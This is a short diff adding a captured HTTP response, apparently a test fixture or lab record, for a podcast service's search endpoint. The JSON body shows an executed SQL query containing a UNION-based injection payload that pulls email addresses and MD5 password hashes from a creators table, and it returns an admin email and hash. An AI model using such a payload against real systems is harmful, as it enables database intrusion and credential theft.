@@ -1,0 +1,8 @@
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Sat, 03 Oct 2026 20:12:53 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+Transfer-Encoding: chunked
+
+{"executed_sql":"SELECT * FROM podcasts WHERE title LIKE '%a' UNION SELECT email, hash_md5 FROM creators--%'","results":[{"id":1,"email":"admin@streamvibe.com","hash_md5":"5f4dcc3b5aa765d61d8327deb882cf99"}]}
